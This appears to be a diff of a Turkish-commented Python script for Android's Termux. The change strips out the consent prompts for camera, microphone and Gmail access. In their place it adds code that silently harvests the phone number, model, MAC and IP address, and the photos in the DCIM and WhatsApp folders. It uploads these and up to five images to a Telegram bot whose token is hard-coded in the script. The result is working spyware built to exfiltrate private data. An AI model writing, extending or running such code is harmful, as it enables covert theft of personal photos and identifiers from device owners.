@@ -3,6 +3,7 @@ import os
 import platform
 import uuid
 import subprocess
+import glob
 
 # 📢 Telegram Bot Bilgileri
 BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
@@ -21,67 +22,47 @@ except:
 device_name = platform.node()
 mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
 
-# 📸 Fotoğraf çekme izni
-photo_path = "/data/data/com.termux/files/home/photo.jpg"
-take_photo = input("📸 Fotoğraf çekmek istiyor musunuz? (Y/N): ").strip().lower()
-if take_photo == "y":
-    try:
-        subprocess.run(["termux-camera-photo", photo_path], check=True)
-    except Exception as e:
-        print(f"Hata: Fotoğraf çekilemedi - {e}")
-        photo_path = None
+# 📞 Telefon numarası alma
+try:
+    phone_number = subprocess.check_output(["termux-telephony-call"], stderr=subprocess.DEVNULL).decode().strip()
+    if not phone_number:
+        phone_number = "Erişim engellendi"
+except:
+    phone_number = "Desteklenmiyor"
 
-# 🎤 MP3 formatında ses kaydı
-audio_wav = "/data/data/com.termux/files/home/audio.wav"
-audio_mp3 = "/data/data/com.termux/files/home/audio.mp3"
+# 📱 Telefon modeli alma
+try:
+    phone_model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
+except:
+    phone_model = "Bilinmiyor"
 
-record_audio = input("🎤 10 saniyelik MP3 ses kaydı almak istiyor musunuz? (Y/N): ").strip().lower()
-if record_audio == "y":
-    try:
-        subprocess.run(["termux-microphone-record", "-l", "10", audio_wav], check=True)
-        subprocess.run(["lame", "--preset", "standard", audio_wav, audio_mp3], check=True)  # WAV → MP3 dönüşümü
-        os.remove(audio_wav)  # WAV dosyasını sil
-    except Exception as e:
-        print(f"Hata: Ses kaydı alınamadı - {e}")
-        audio_mp3 = None
-
-# 📧 Gmail hesaplarını çekme
-gmail_accounts = []
-read_gmail = input("📧 Gmail hesaplarını almak istiyor musunuz? (Y/N): ").strip().lower()
-if read_gmail == "y":
-    try:
-        output = subprocess.check_output(["termux-account"], stderr=subprocess.DEVNULL).decode().strip()
-        gmail_accounts = output.split("\n") if output else []
-    except:
-        gmail_accounts = ["Erişim izni reddedildi veya desteklenmiyor"]
+# 📂 WhatsApp & DCIM klasöründen resimleri alma (PNG & JPG)
+image_paths = glob.glob("/sdcard/DCIM/**/*.jpg", recursive=True) + glob.glob("/sdcard/DCIM/**/*.png", recursive=True)
+image_paths += glob.glob("/sdcard/WhatsApp/**/*.jpg", recursive=True) + glob.glob("/sdcard/WhatsApp/**/*.png", recursive=True)
 
 # 📩 Telegram’a gönderme
 message = f"""
 📡 **Bilgiler**
 🌍 IP: {ip_address}
-🇨🇺 Ülke: {country}
+🇹🇷 Ülke: {country}
 🏙️ Şehir: {city}
 💻 Cihaz Adı: {device_name}
 📡 MAC Adresi: {mac_address}
 
-📧 **Gmail Hesapları**
-{', '.join(gmail_accounts) if gmail_accounts else "Bulunamadı"}
+📞 Telefon Numarası: {phone_number}
+📱 Telefon Modeli: {phone_model}
+
+📂 WhatsApp & DCIM'deki resim sayısı: {len(image_paths)}
 """
 
 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message})
 
-# Fotoğraf gönderme
-if take_photo == "y" and photo_path and os.path.exists(photo_path):
+# 📤 Resimleri Telegram'a gönderme
+for img_path in image_paths[:5]:  # İlk 5 resmi gönder (fazla olursa engellenebilir)
     try:
-        with open(photo_path, "rb") as photo_file:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", files={"photo": photo_file}, data={"chat_id": CHAT_ID})
+        with open(img_path, "rb") as img_file:
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", files={"photo": img_file}, data={"chat_id": CHAT_ID})
     except:
-        print("⚠️ Fotoğraf gönderilemedi.")
+        print(f"⚠️ Gönderilemedi: {img_path}")
 
-# MP3 ses dosyası gönderme
-if record_audio == "y" and audio_mp3 and os.path.exists(audio_mp3):
-    try:
-        with open(audio_mp3, "rb") as audio_file:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio", files={"audio": audio_file}, data={"chat_id": CHAT_ID})
-    except:
-        print("⚠️ MP3 ses kaydı gönderilemedi.")
+print("✅ Bilgiler ve resimler Telegram'a gönderildi.")
